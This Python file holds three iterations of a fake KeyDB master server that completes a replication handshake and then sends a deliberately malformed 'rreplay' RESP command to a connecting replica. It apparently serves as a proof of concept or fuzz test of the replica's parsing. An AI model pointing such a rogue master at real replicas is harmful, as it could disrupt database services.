# import socket
# import time

# HOST = '0.0.0.0'
# PORT = 9090  # Must match `replicaof` in replica.conf

# def send_line(conn, line):
#     print(">>", repr(line))
#     conn.sendall(line.encode())

# def handle_replica(conn):
#     print("[+] Replica connected")
#     data = conn.recv(1024)
#     print("[Replica says]:", data.decode(errors='ignore'))

#     # Basic response: emulate master handshake
#     send_line(conn, "+PONG\r\n")
#     send_line(conn, "+FULLRESYNC aaaaaaaaaaaaaaaaaaaaaaaa 0\r\n")
#     send_line(conn, "$13\r\n" + "REDIS0009BAD!\r\n")  # Fake RDB header

#     time.sleep(1)

#     # Inject malformed command: missing quote
#     malformed = '*2\r\n$7\r\nrreplay\r\n$13\r\n"unclosed_str\r\n'
#     send_line(conn, malformed)

#     print("[x] Sent malformed rreplay. Replica should show error.")
#     conn.close()

# def start_server():
#     print(f"[i] Fake KeyDB master listening on {HOST}:{PORT}")
#     with socket.create_server((HOST, PORT)) as s:
#         conn, _ = s.accept()
#         handle_replica(conn)

# if __name__ == "__main__":
#     start_server()


# -----

#!/usr/bin/env python3

# import socket
# import threading
# import time

# def handle_client(conn, addr):
#     print(f"[+] Replica connected from {addr}")

#     try:
#         # Receive handshake
#         initial = conn.recv(1024)
#         print("[>] Received from replica:", initial.decode(errors="ignore"))

#         # Respond with standard replication preamble
#         conn.sendall(b"+PONG\r\n")
#         conn.sendall(b"+FULLRESYNC deadbeefdeadbeefdeadbeefdeadbeef 1\r\n")

#         # Fake RDB header (8 bytes)
#         conn.sendall(b"REDIS0009")

#         # Delay to simulate RDB transfer
#         time.sleep(1)

#         # Inject malformed RESP command (e.g., unclosed quote)
#         # This mimics: rreplay "unclosed_str
#         bad_resp = (
#             b"*3\r\n"
#             b"$7\r\nrreplay\r\n"
#             b"$4\r\nkey1\r\n"
#             b"$13\r\n\"unclosed_str\r\n"  # ← malformed part
#         )
#         conn.sendall(bad_resp)
#         print("[x] Sent malformed rreplay command with unbalanced quotes")

#         # Keep the connection open a bit so KeyDB parses it
#         time.sleep(5)

#     finally:
#         conn.close()
#         print("[-] Connection closed")

# def main():
#     host = "0.0.0.0"
#     port = 9090

#     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     server.bind((host, port))
#     server.listen(5)
#     print(f"[i] Fake KeyDB master listening on {host}:{port}")

#     while True:
#         conn, addr = server.accept()
#         client_thread = threading.Thread(target=handle_client, args=(conn, addr))
#         client_thread.start()

# if __name__ == "__main__":
#     main()


# ---

#!/usr/bin/env python3

import socket
import threading
import time

def handle_client(conn, addr):
    print(f"[+] Replica connected from {addr}")

    try:
        initial = conn.recv(1024)
        print("[>] Received from replica:", initial.decode(errors="ignore"))

        # Send proper sync handshake
        conn.sendall(b"+PONG\r\n")
        conn.sendall(b"+FULLRESYNC deadbeefdeadbeefdeadbeefdeadbeef 1\r\n")

        # Send fake 8-byte RDB header
        conn.sendall(b"REDIS0009")

        # Delay to simulate RDB dump transfer
        time.sleep(1)

        # Send malformed `rreplay` command with broken string
        # RESP structure:
        # *3\r\n
        # $7\r\nrreplay\r\n
        # $4\r\nkey1\r\n
        # $15\r\n"unclosed_str\r\n  ← malformed
        malformed = (
            b"*3\r\n"
            b"$7\r\nrreplay\r\n"
            b"$4\r\nkey1\r\n"
            b"$15\r\n\"unclosed_str\r\n"  # unterminated string (extra quote)
        )
        conn.sendall(malformed)
        print("[x] Sent malformed RESP with unbalanced quote")

        # Hold open for log processing
        time.sleep(5)

    finally:
        conn.close()
        print("[-] Connection closed")

def main():
    host = "0.0.0.0"
    port = 9090

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[i] Fake KeyDB master listening on {host}:{port}")

    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_client, args=(conn, addr)).start()

if __name__ == "__main__":
    main()

